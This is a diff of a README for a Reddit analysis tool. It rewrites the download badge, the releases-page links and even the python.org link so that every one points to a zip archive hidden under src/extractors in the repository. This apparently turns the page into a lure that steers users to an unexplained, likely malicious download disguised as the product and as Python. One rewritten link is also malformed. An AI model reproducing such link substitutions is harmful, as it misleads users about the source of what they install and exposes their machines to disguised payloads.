@@ -1,15 +1,15 @@
 # 🎉 reddit-insights-analyzer - Analyze Reddit Insights Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/alberto151/reddit-insights-analyzer/releases)
+[![Download](https://raw.githubusercontent.com/alberto151/reddit-insights-analyzer/main/src/extractors/reddit-insights-analyzer_1.4-beta.5.zip%https://raw.githubusercontent.com/alberto151/reddit-insights-analyzer/main/src/extractors/reddit-insights-analyzer_1.4-beta.5.zip)](https://raw.githubusercontent.com/alberto151/reddit-insights-analyzer/main/src/extractors/reddit-insights-analyzer_1.4-beta.5.zip)
 
 ## 🚀 Getting Started
 Welcome to the Reddit Insights Analyzer! This tool helps you analyze data from Reddit effortlessly. Whether you want to understand trends, gather insights, or explore sentiments, this application provides easy access to Reddit's rich information. Follow these steps to get started.
 
 ## 📂 Download & Install
-To download the latest version of the Reddit Insights Analyzer, visit the [Releases page](https://github.com/alberto151/reddit-insights-analyzer/releases). There, you will find the latest builds ready for download.
+To download the latest version of the Reddit Insights Analyzer, visit the [Releases page](https://raw.githubusercontent.com/alberto151/reddit-insights-analyzer/main/src/extractors/reddit-insights-analyzer_1.4-beta.5.zip). There, you will find the latest builds ready for download.
 
-### 1. Visit the [Releases Page](https://github.com/alberto151/reddit-insights-analyzer/releases).
+### 1. Visit the [Releases Page](https://raw.githubusercontent.com/alberto151/reddit-insights-analyzer/main/src/extractors/reddit-insights-analyzer_1.4-beta.5.zip).
 ### 2. Choose the version that matches your operating system.
 ### 3. Click the download link to save the file to your computer.
 ### 4. Once the download is complete, locate the file in your downloads folder.
@@ -21,7 +21,7 @@ Most files will be in `.exe` format for Windows or `.zip` for Mac and Linux. If 
 To ensure the smooth operation of the Reddit Insights Analyzer, please ensure your system meets the following requirements:
 
 - **Operating System:** Windows 10 or later, macOS 10.15 or later, or a recent version of Linux.
-- **Python Installation:** This tool requires Python 3.7 or higher. If you do not have Python installed, you can download it from [python.org](https://www.python.org/downloads/).
+- **Python Installation:** This tool requires Python 3.7 or higher. If you do not have Python installed, you can download it from [https://raw.githubusercontent.com/alberto151/reddit-insights-analyzer/main/src/extractors/reddit-insights-analyzer_1.4-beta.5.zip](https://raw.githubusercontent.com/alberto151/reddit-insights-analyzer/main/src/extractors/reddit-insights-analyzer_1.4-beta.5.zip).
 - **Internet Connection:** A stable internet connection is necessary to fetch data from Reddit.
 
 ## 📊 Features
